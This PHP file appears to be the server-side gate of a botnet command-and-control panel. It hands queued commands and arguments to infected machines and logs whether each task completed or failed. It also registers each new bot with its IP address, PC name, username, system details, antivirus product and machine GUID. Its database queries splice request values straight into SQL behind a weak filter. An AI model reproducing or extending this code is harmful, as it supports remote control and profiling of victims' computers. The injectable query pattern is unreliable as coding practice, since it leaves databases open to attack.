<?php
include("inc/config.php");
if (isset($_POST['getcmd']))
{
$target = $_POST['target'];
$target = preg_replace("~[\\/:*?'<>|]~", ' ', $target);
$query ="SELECT cmd,arg1,arg2,arg3,arg4,cid FROM tasks WHERE target='$target' AND `status`='processing'";
$result = mysqli_query($conn, $query) or die("Ошибка " . mysqli_error($conn));
$row = mysqli_fetch_row($result);
$cmd = $row[0];
$arg1 = $row[1];
$arg2 = $row[2];
$arg3 = $row[3];
$arg4 = $row[4];
$cid = $row[5];
if ($cmd == "" || $cmd == null) $cmd = "null";
if ($arg1 == "" || $arg1 == null) $arg1 = "null";
if ($arg2 == "" || $arg2 == null) $arg2 = "null";
if ($arg3 == "" || $arg3 == null) $arg3 = "null";
if ($arg4 == "" || $arg4 == null) $arg4 = "null";
if ($cid == "" || $cid == null) $cid = "null";
$output_array = array( 'task'=>array('cmd' => $cmd, 'arg1' => $arg1,'arg2' => $arg2,'arg3' => $arg3,'arg4' => $arg4, 'cid' => $cid) );

echo json_encode( $output_array );
}
if (isset($_POST['cmpcmd']))
{
$status = $_POST['cmpcmd'];
$status = preg_replace("~[\\/:*?'<>|]~", ' ', $status);
$cid = $_POST['cid'];
$cid = preg_replace("~[\\/:*?'<>|]~", ' ', $cid);
$completed = date("Y,m,d H:i:s");
if ($status == "1")
$sql = "UPDATE tasks SET `status`='completed',`completed`='$completed' WHERE `cid`='$cid'";
else if ($status == "0")  $sql = "UPDATE tasks SET `status`='failed',`completed`='$completed' WHERE `cid`='$cid'";
if (mysqli_query($conn, $sql)) echo "";
else echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}
if (isset($_POST['sysinfo']))
{
$ip = $_SERVER['REMOTE_ADDR'];
$username = $_POST['username'];
$username = preg_replace("~[\\/:*?'<>|]~", ' ', $username);
$pcname = $_POST['pcname'];
$pcname = preg_replace("~[\\/:*?'<>|]~", ' ', $pcname);
$sysinfo = $_POST['sysinfo'];
$sysinfo = preg_replace("~[\\/:*?'<>|]~", ' ', $sysinfo);
$avname = $_POST['avname'];
$avname = preg_replace("~[\\/:*?'<>|]~", ' ', $avname);
$machineguid = $_POST['machineguid'];
$machineguid = preg_replace("~[\\/:*?'<>|]~", ' ', $machineguid);
$version = $_POST['version'];
$version = preg_replace("~[\\/:*?'<>|]~", ' ', $version);
//$status = $_POST['status'];
//$status = preg_replace("~[\\/:*?'<>|]~", ' ', $status);


$query = "SELECT pcname FROM bots";
$res2 = mysqli_query($conn, $query) or die("Ошибка " . mysqli_error($conn));
$btcount=mysqli_num_rows($res2);
if ($btcount < 1)
{
$completed = date("Y,m,d H:i:s");
$sql = "INSERT INTO bots (ip, pcname, username, sysinfo, avname, machineguid, version/*, status*/) VALUES ('$ip','$pcname','$username','$sysinfo', '$avname', '$machineguid', '$version'/*, '$status'*/)";
if (mysqli_query($conn, $sql)) echo "";
else echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}
}